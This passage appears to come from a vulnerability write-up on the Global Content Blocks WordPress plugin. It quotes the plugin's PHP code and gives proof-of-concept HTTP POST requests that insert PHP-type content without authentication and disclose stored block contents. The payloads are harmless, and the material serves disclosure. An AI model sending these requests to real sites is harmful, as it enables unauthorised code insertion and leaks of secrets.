class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-9"><span class="crayon-sy">$</span><span class="crayon-v">value</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'content'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-10">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-11"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid call!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-12">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-13"><span class="crayon-sy">$</span><span class="crayon-v">available_types</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"other"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"General"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"gcb.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Content block"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"adsense"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Adsense"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"adsense.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Adsense code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"code"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Code"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"code.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Programming code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"form"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Form"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"form.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"General form"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"html"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"HTML"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"html.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Raw HTML code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"iframe"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Iframe"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"iframe.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Iframe code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"optin"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Opt-In Form"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"optin.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Opt-In form code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"php"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"PHP Code"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"php.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"PHP code (without &lt;!--?php, &lt;?, ?--&gt; tags)"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-24"><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"insert into "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"gcb (name,description,value,type) VALUES ('"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">description</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">value</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">type</span><span class="crayon-sy">.</span><span class="crayon-s">"')"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-26"><span class="crayon-sy">$</span><span class="crayon-v">inserted_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_insert_id</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-28"><span class="crayon-sy">$</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-29"><span class="crayon-s">"id"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">inserted_id</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-30"><span class="crayon-s">"name"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-31"><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-v">available_types</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">type</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">"img"</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-32"><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-33">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-34"><span class="crayon-e">echo </span><span class="crayon-e">json_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-st">return</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0140 seconds] -->
<p>So it starts by doing some initializations, validate that all the input is there that it needs, and do mostly best-practice sanitization. It then inserts the value into a database and returns the same value back in json format. The problem here is that at no point has the script checked that the calling user is logged in, and is an admin(This is important because it allows for inserting PHP code, which could cause an arbitrary code execution).</p>
<p>It does sanitization of all values but the name, but as it turns out this is all output encoded in the admin interface. But we&#8217;re still able to insert arbitrary content into the table without authentication, which could be bad due to the possibility of PHP code being inserted. This can be exploited like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f27af6021724815" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/global-content-blocks/resources/tinymce/gcb_ajax_add.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 129

name=My malicious request&amp;content=echo 'Hello buddy', nice day';&amp;type=php&amp;description=This is really not malicious code, I swear.</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f27af6021724815-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27af6021724815-2">2</div><div class="crayon-num" data-line="crayon-53c9878f27af6021724815-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27af6021724815-4">4</div><div class="crayon-num" data-line="crayon-53c9878f27af6021724815-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27af6021724815-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f27af6021724815-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">resources</span><span class="crayon-o">/</span><span class="crayon-i">tinymce</span><span class="crayon-o">/</span><span class="crayon-v">gcb_ajax_add</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27af6021724815-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f27af6021724815-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27af6021724815-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">129</span></div><div class="crayon-line" id="crayon-53c9878f27af6021724815-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27af6021724815-6"><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">My </span><span class="crayon-e">malicious </span><span class="crayon-i">request</span><span class="crayon-o">&amp;</span><span class="crayon-v">content</span><span class="crayon-o">=</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'Hello buddy'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">nice </span><span class="crayon-i">day</span>'<span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-i">php</span><span class="crayon-o">&amp;</span><span class="crayon-v">description</span><span class="crayon-o">=</span><span class="crayon-r">This</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">really </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-e">malicious </span><span class="crayon-i">code</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">I</span><span class="crayon-h"> </span><span class="crayon-v">swear</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0034 seconds] -->
<p><strong>Analysis of gdbvalue.php vulnerability</strong><br />
Another part of the admin interface is used to fetch the value of a content block, i.e the php code or other trip of content that may be reused on pages. In cases where it is php code, source code disclosure is a concern. The next 3 vulnerabilities allows for disclosure of block contents. The first one is in [/resources/tinymce/gcbvalue.php](http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/resources/tinymce/gcbvalue.php):</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f27afe170339125" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(!isset($_POST["id"]) || intval($_POST["id"])get_row("select value from ".$wpdb-&gt;prefix."gcb where id=".$gcb_id);
if($val!==null) {
    echo stripslashes(htmlspecialchars_decode($val-&gt;value));
}
die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f27afe170339125-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27afe170339125-2">2</div><div class="crayon-num" data-line="crayon-53c9878f27afe170339125-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27afe170339125-4">4</div><div class="crayon-num" data-line="crayon-53c9878f27afe170339125-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f27afe170339125-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"id"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"id"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"select value from "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gcb where id="</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">gcb_id</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27afe170339125-2"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">val</span><span class="crayon-o">!==</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f27afe170339125-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">echo </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars_decode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">val</span><span class="crayon-o">-&gt;</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27afe170339125-4"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f27afe170339125-5"><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p>We see some validation of the input id to prevent SQL injection, and then a SQL query which will be used to print out the value(Code/markup) to the page. There is no validation that the caller is an admin, which means we can fetch the value(Which can be PHP code) with a simple HTTP request</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f27b04863474937" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/global-content-blocks/resources/tinymce/gcbvalue.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

id=1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f27b04863474937-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b04863474937-2">2</div><div class="crayon-num" data-line="crayon-53c9878f27b04863474937-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b04863474937-4">4</div><div class="crayon-num" data-line="crayon-53c9878f27b04863474937-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b04863474937-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f27b04863474937-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">resources</span><span class="crayon-o">/</span><span class="crayon-i">tinymce</span><span class="crayon-o">/</span><span class="crayon-v">gcbvalue</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b04863474937-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f27b04863474937-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b04863474937-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line" id="crayon-53c9878f27b04863474937-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b04863474937-6"><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p>This will disclose the contents of the block, which may contain PHP code that may contain secrets.</p>
<p>Analysis of gcb_export.php vulnerability<br />
A feature that the admin panel of this plugin is that it will export the block defined for easy import into another blog. It does so by calling <a href="http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/gcb/gcb_export.php">/gcb/gcb_export.php</a>, which forces the browser to download a .gcb file which contains base64 encoded content.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f27b0b931493027" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
